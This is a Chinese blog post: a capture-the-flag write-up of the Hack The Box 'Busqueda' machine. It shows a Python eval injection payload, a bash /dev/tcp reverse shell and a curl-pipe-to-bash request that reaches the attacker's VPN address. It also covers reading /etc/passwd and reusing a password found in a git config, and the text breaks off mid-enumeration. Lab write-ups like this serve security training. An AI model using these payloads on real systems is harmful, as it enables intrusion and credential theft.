<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>hack the box |  小张之栈</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      <canvas class="fireworks"></canvas>
      <style>
        .fireworks {
          position: fixed;
          left: 0;
          top: 0;
          z-index: 99999;
          pointer-events: none;
        }
      </style>
      
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-hack-the-box"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  hack the box
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/18/hack-the-box/" class="article-date">
  <time datetime="2023-06-18T00:11:37.000Z" itemprop="datePublished">2023-06-18</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">10.4k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">57 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <p>下载htb的openvpn文件后，openvpn 文件</p>
<p>目的是获取user.txt和root.txt</p>
<h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="1-Busqueda-linux提权"><a href="#1-Busqueda-linux提权" class="headerlink" title="1.Busqueda(linux提权)"></a>1.Busqueda(linux提权)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1LV4y1Z7Wp/?spm_id_from=333.337.search-card.all.click">Hack The Box 赛季活动靶场【Busqueda】User &amp; System Flag攻略_哔哩哔哩_bilibili</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37370714/article/details/130619426?ops_request_misc=&request_id=&biz_id=102&utm_term=Busqueda&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-130619426.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) HTB-Busqueda_永远是深夜有多好。的博客-CSDN博客</a></p>
<p>ping一遍，能ping通</p>
<p>发现端口：&#96;nmap -A  10.10.11.208 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://searcher.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>

<p>22端口开放，一般最后考虑，如果爆破不出来就放弃。</p>
<p>火狐直接访问，访问不了</p>
<p>在hosts文件添加域名</p>
<p><code>echo &quot;10.10.11.208 searcher.htb &quot; &gt;&gt; /etc/hosts</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192607683.png"></p>
<p>选了个google，查找内容为123</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192819640.png"></p>
<p>很明显，post。</p>
<p>抓包试试，加个单引号不显示内容</p>
<p>sqlmap一下，没有注入点。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604194935260.png"></p>
<p>点击后，发现如下东西：</p>
<blockquote>
<p>Custom Engine</p>
<p>from searchor import Engine<br>Engine.new(“Colgate”, “<a target="_blank" rel="noopener" href="https://www.colgate.com/en-us/search/all?term=">https://www.colgate.com/en-us/search/all?term=</a>“)<br>Engine.Colgate.search(“Hi world!”)<br>‘<a target="_blank" rel="noopener" href="https://www.colgate.com/en-us/search/all?term=Hi%20world">https://www.colgate.com/en-us/search/all?term=Hi%20world</a>!”</p>
<p>Searchor CLI Quick Start</p>
<p>$ searchor Google “Hello World!” –copy</p>
</blockquote>
<p>这是调用引擎库去获取数据吧。</p>
<p><code>Engine.Colgate.search(&quot;Hi world!&quot;)</code></p>
<p>wp上说尝试构造<code>eval(complie(“要执行的代码”),“&lt;String&gt;”,“exec”)</code></p>
<blockquote>
<p>compile() 是一个 Python 内置函数，用于编译字符串、文件或 AST（Abstract Syntax Trees）对象成为字节码或 AST 对象。它的语法为：</p>
<p>compile(source, filename, mode, flags&#x3D;0, dont_inherit&#x3D;False, optimize&#x3D;-1)<br>source: 必选项，表示要编译的源代码，可以是字符串、文件或 AST 对象。<br>filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “<string>” 即可。<br>mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或 “single”（编译单个语句）。<br>flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。<br>dont_inherit: 可选项，表示是否继承 sys.flags 和 sys. __ optimizations __ 模块中相关选项的值。<br>optimize: 可选项，表示优化级别，如果设置为 -1，表示使用默认优化级别。<br>compile() 函数编译完成后，将会返回一个 code 对象，这个对象可以传递给 exec() 函数执行，也可以将其作为模块使用。compile() 函数在 Python 中比较常用，常用于动态编译、语法检查和代码执行等场景中。</p>
</blockquote>
<p>在bp上这样构造：</p>
<blockquote>
<p>query&#x3D;123’<strong>%2b</strong>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))<strong>%2b’</strong></p>
</blockquote>
<p>+、%20我都试过，不行，为啥非要2b,2f也可以，不懂</p>
<p>效果是这样的，</p>
<blockquote>
<p>searchor Google <strong>‘</strong>123’%2beval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))%2b’<strong>’</strong>–copy</p>
</blockquote>
<p>相当于执行了参数为:</p>
<p><strong>‘</strong>123’ </p>
<p>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))</p>
<p>和&#39;‘</p>
<p>repeat结果里是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;app.py%0Atemplates&quot;&gt;app.py</span><br><span class="line">templates&lt;/a&gt;. If not, click the link.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那其实ls可以改为 cat app.py，出现一串代码</p>
<p>shift+ctrl+u后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, request, redirect</span><br><span class="line">from searchor import Engine</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&amp;#x27;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/search&amp;#x27;, methods=[&amp;#x27;POST&amp;#x27;])</span><br><span class="line">def search():</span><br><span class="line">    try:</span><br><span class="line">        engine = request.form.get(&amp;#x27;engine&amp;#x27;)</span><br><span class="line">        query = request.form.get(&amp;#x27;query&amp;#x27;)</span><br><span class="line">        auto_redirect = request.form.get(&amp;#x27;auto_redirect&amp;#x27;)</span><br><span class="line">        </span><br><span class="line">        if engine in Engine.__members__.keys():</span><br><span class="line">            arg_list = [&amp;#x27;searchor&amp;#x27;, &amp;#x27;search&amp;#x27;, engine, query]</span><br><span class="line">            r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">            url = r.stdout.strip().decode()</span><br><span class="line">            if auto_redirect is not None:</span><br><span class="line">                return redirect(url, code=302)</span><br><span class="line">            else:</span><br><span class="line">                return url</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Invalid engine!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Something went wrong!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#x27;__main__&amp;#x27;:</span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="1-shell文件准备"><a href="#1-shell文件准备" class="headerlink" title="1.shell文件准备"></a>1.shell文件准备</h4><p>写一个shell文件</p>
<p>内容为：<code>bash -i &gt;&amp; /dev/tcp/10.10.14.89/2333 0&gt;&amp;1</code></p>
<p>这个地址是与htp进行vpn连接的那个地址吧,tun0。</p>
<p>具体步骤也就是vim shell后，再chmod 777 shell.</p>
<h4 id="2-监听服务器建立"><a href="#2-监听服务器建立" class="headerlink" title="2.监听服务器建立"></a>2.监听服务器建立</h4><p><code>python3 -m http.server 80</code> 通常用于在本地开发或测试时快速提供 Web 内容。</p>
<h4 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h4><p><code>nc -lvnp 2333</code></p>
<h4 id="4-发包"><a href="#4-发包" class="headerlink" title="4.发包"></a>4.发包</h4><p>包的数据写为</p>
<p><code>query=http%3a//127.0.0.1/debug&#39;%2beval(compile(&#39;for+x+in+range(1)%3a\n+import+os\n+os.system(&quot;curl+http%3a//10.10.14.89/shell|bash&quot;)&#39;,&#39;a&#39;,&#39;single&#39;))%2b&#39;</code></p>
<p>(不明觉厉o(￣▽￣)ｄ )</p>
<p>。。。然后捏，我没监听到东西。</p>
<p>可能<strong>是因为kali有防火墙</strong></p>
<p><code>sudo systemctl stop ufw</code></p>
<p><code>sudo systemctl disable ufw</code></p>
<p>将防火墙禁用，重新发包即可。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604214533285.png"></p>
<p>nc监听成功。</p>
<p>然后在nc窗口下</p>
<p>输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">connect to [10.10.14.89] from (UNKNOWN) [10.10.11.208] 56914</span><br><span class="line">bash: cannot set terminal process group (1648): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">svc@busqueda:/var/www/app$ pwd </span><br><span class="line">pwd</span><br><span class="line">/var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ whoami</span><br><span class="line">whoami</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/var/www/app$ ls</span><br><span class="line">ls</span><br><span class="line">app.py</span><br><span class="line">templates</span><br><span class="line">svc@busqueda:/var/www/app$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">svc@busqueda:/home$ ls</span><br><span class="line">ls</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/home$ cd svc</span><br><span class="line">cd svc</span><br><span class="line">svc@busqueda:~$ ls </span><br><span class="line">ls</span><br><span class="line">snap</span><br><span class="line">user.txt</span><br><span class="line">svc@busqueda:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">40941e3cddd105f881ea90e716a3d6a2</span><br><span class="line"></span><br><span class="line">cat etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 busqueda searcher.htb gitea.searcher.htb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(内网信息收集部分，参考大佬的习惯是先看sudo -l，再看是否存在未知域名，然后再看web文件夹)<br>访问下未知域名gitea.searcher.htb，<strong>反正我不知道怎么访问</strong>（后面有，先放一边）。</p>
<p>密码一般在etc&#x2F;passwd和etc&#x2F;shadow中，后者的密码一般是哈希值。</p>
<p>在passwd中找有bash权限的用户，已知有svc，且确定下一个提权的是root</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/$ cat etc/passwd|grep /bin/bash</span><br><span class="line">cat etc/passwd|grep /bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br></pre></td></tr></table></figure>

<p>重新找到svc文件夹，这次要记得查看<strong>所有</strong>文件，注意隐藏文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 6 svc  svc  4096 Jun  4 12:57 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache</span><br><span class="line">-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 10:26 .gnupg</span><br><span class="line">drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local</span><br><span class="line">lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 04:06 snap</span><br><span class="line">-rw-r----- 1 root svc    33 Jun  4 03:26 user.txt</span><br><span class="line">-rw------- 1 svc  svc  9573 Jun  4 11:29 .viminfo</span><br><span class="line">-rw------- 1 svc  svc    54 Jun  4 07:23 .Xauthority</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>-l长格式信息,-a 所有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ cat .gitconfig</span><br><span class="line">cat .gitconfig</span><br><span class="line">[user]</span><br><span class="line">        email = cody@searcher.htb</span><br><span class="line">        name = cody</span><br><span class="line">[core]</span><br><span class="line">        hooksPath = no-hooks</span><br></pre></td></tr></table></figure>

<p>注意到，一开始监听进来时，有&#x2F;var&#x2F;www&#x2F;app，查看下隐藏文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/home$  ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd /var/www/app</span><br><span class="line">cd /var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .git</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates</span><br><span class="line">svc@busqueda:/var/www/app$ </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/var/www/app$ cd .git</span><br><span class="line">cd .git</span><br><span class="line">svc@busqueda:/var/www/app/.git$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches</span><br><span class="line">-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG</span><br><span class="line">-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config</span><br><span class="line">-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description</span><br><span class="line">-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks</span><br><span class="line">-rw-r--r-- 1 root     root      259 Apr  3 15:09 index</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs</span><br><span class="line">drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects</span><br><span class="line">drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看下config和logs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">svc@busqueda:/var/www/app/.git$ cat config</span><br><span class="line">cat config</span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cd main</span><br><span class="line">cd main</span><br><span class="line">bash: cd: main: Not a directory</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cat main</span><br><span class="line">cat main</span><br><span class="line">0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000  update by push</span><br><span class="line">这里大佬已经试用过了，哈希值破不开，转看config</span><br></pre></td></tr></table></figure>

<p>哎，上述内容在大佬博客里引入了linpeas工具，应该是可以帮助自动查找文件的。</p>
<p>关注下这串代码：</p>
<p><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></p>
<p>尝试下cody后的东西作为密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#115;&#x76;&#x63;&#x40;&#x31;&#48;&#46;&#49;&#48;&#x2e;&#x31;&#49;&#46;&#x32;&#48;&#56;">&#115;&#x76;&#x63;&#x40;&#x31;&#48;&#46;&#49;&#48;&#x2e;&#x31;&#49;&#46;&#x32;&#48;&#56;</a>，ssh连接即可。</p>
<h3 id="svc-gt-root"><a href="#svc-gt-root" class="headerlink" title="svc-&gt;root"></a>svc-&gt;root</h3><p>登录进来后</p>
<p><code>sudo -l</code> 为了看看当前用户可执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>之后的操作便是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ls 有user.txt</span><br><span class="line"></span><br><span class="line">cd /</span><br><span class="line"></span><br><span class="line">ls   有etc文件夹</span><br><span class="line"></span><br><span class="line">cd etc</span><br><span class="line"></span><br><span class="line">ls ，看到了有apache2文件夹</span><br><span class="line"></span><br><span class="line">cd apache2</span><br><span class="line">svc@busqueda:/etc/apache2$ ls</span><br><span class="line">apache2.conf    conf-enabled  magic           mods-enabled  sites-available</span><br><span class="line">conf-available  envvars       mods-available  ports.conf    sites-enabled</span><br><span class="line">svc@busqueda:/etc/apache2$ cat  sites-available</span><br><span class="line"></span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -a</span><br><span class="line">.  ..  000-default.conf  default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls 